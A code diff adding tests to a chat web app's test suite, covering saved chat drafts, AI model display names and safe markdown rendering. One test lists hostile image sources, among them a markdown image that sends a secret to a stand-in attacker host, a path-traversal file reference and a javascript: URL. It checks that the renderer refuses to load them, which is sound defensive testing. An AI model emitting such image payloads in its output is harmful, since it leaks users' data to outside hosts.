@@ -22,6 +22,7 @@ import { allowed, landing } from "./lib/given.ts";
 import { modelName, shortChoices } from "./lib/models.ts";
 import { byPlace, moved } from "./lib/order.ts";
 import type { Way } from "./lib/types.ts";
+import { forgetTyped, setTyped, typed } from "./lib/prefs.ts";
 import { parts, sourceAt } from "./lib/blocks.ts";
 import { languageOf, tokens } from "./lib/code.ts";
 
@@ -240,6 +241,31 @@ describe("the order somebody dragged conversations into", () => {
   });
 });
 
+describe("what is written in the chat box and not sent", () => {
+  test("is kept by conversation, goes when emptied, and all goes on signing out", () => {
+    const kept = Object.create({
+      getItem: (key: string) => kept[key] ?? null,
+      setItem: (key: string, value: string) => void (kept[key] = value),
+      removeItem: (key: string) => void delete kept[key],
+    });
+    Object.defineProperty(globalThis, "localStorage", { value: kept, configurable: true });
+    try {
+      kept["chloe.theme"] = "red";
+      setTyped("chloe", "", "a new chat");
+      setTyped("chloe", "chloe/one", "half a thought");
+      strictEqual(typed("chloe", ""), "a new chat");
+      strictEqual(typed("chloe", "chloe/one"), "half a thought");
+      strictEqual(typed("chloe", "chloe/two"), "");
+      setTyped("chloe", "", "");
+      strictEqual("chloe.typed.chloe." in kept, false);
+      forgetTyped();
+      deepStrictEqual(Object.keys(kept), ["chloe.theme"]);
+    } finally {
+      delete (globalThis as { localStorage?: unknown }).localStorage;
+    }
+  });
+});
+
 describe("a model's name on the page", () => {
   test("in the words its maker's own app uses", () => {
     deepStrictEqual(
@@ -248,8 +274,19 @@ describe("a model's name on the page", () => {
     );
   });
 
+  test("DeepSeek and Kimi, whichever route carries them", () => {
+    deepStrictEqual(
+      ["opencode-go/deepseek-v4.1-flash", "opencode-go/kimi-k3.1-pro", "opencode-go/kimi-k3"].map(modelName),
+      ["DeepSeek V4.1 Flash", "Kimi K3.1 Pro", "Kimi K3"],
+    );
+  });
+
+  test("a model that trains on what it is sent says so", () => {
+    strictEqual(modelName("opencode-go/muse-spark-1.3-contributor"), "Muse Spark 1.3 (training model)");
+  });
+
   test("anybody else's stays as written, and a route named after it stays", () => {
-    strictEqual(modelName("opencode-go/deepseek-v4.1-flash"), "opencode-go/deepseek-v4.1-flash");
+    strictEqual(modelName("opencode-go/glm-5.3"), "opencode-go/glm-5.3");
     strictEqual(modelName("anthropic/claude-opus-5-5 via opencode"), "Claude Opus 5.5 via opencode");
   });
 
@@ -327,6 +364,37 @@ describe("markdown, rendered", () => {
     };
     render = (text) => renderToStaticMarkup(createElement(module.Markdown, { text }));
     unmarked = module.unmarked;
+  });
+
+  test("a picture loads only from the runtime's own files, and anything else stays a link", () => {
+    const own = render("![A fox](file:chloe/abc-123)");
+    ok(own.includes('<img src="/api/agents/chloe/chat/files/abc-123"'), "its own file loads");
+    ok(own.includes('alt="A fox"'), "says what it shows");
+    for (const away of ["![track](https://evil.example/?said=secret)", "![x](http://evil.example/a.png)", "![x](/api/tokens)", "![x](file:chloe/../../etc)", "![x](data:image/svg+xml,a)", "![x](javascript:alert(1))"]) {
+      ok(!render(away).includes("<img"), `${away} does not load`);
+    }
+    ok(render("![track](https://evil.example/a.png)").includes('href="https://evil.example/a.png"'), "it is a link somebody has to press");
+  });
+
+  test("a link inside bold is still a link", () => {
+    const html = render("**[Piqosity](https://www.piqosity.com/tests):** free");
+    ok(html.includes('<strong><a class="away" href="https://www.piqosity.com/tests"'), "a link, in bold");
+    ok(!html.includes("]("), "no marks left");
+  });
+
+  test("pictures alone on a line are a row, and one among words sits in them", () => {
+    ok(render("![a](file:c/1) ![b](file:c/2)\n![d](file:c/3)").includes('class="pics n3"'), "a row of three");
+    ok(render("![a](file:c/1)").includes('class="pics n1"'), "one alone");
+    ok(render("1. ![a](file:c/1) **Name**: why").includes('<li><a class="pic"'), "beside a list item");
+    strictEqual(unmarked("See ![a fox](file:c/1) here"), "See a fox here");
+  });
+
+  test("a file a reply handed over is a card, and a PDF says so", () => {
+    const card = render("[Rory's worksheet.pdf](file:chloe/abc)");
+    ok(card.includes('class="file-card"'), "a card");
+    ok(card.includes('href="/api/agents/chloe/chat/files/abc"'), "that opens it");
+    ok(card.includes('class="kind pdf">PDF'), "says it is a PDF");
+    ok(render("[notes.txt](file:chloe/abc)").includes(">File<"), "anything else is a file");
   });
 
   test("a writing fence is a card of prose, copied without its marks", () => {
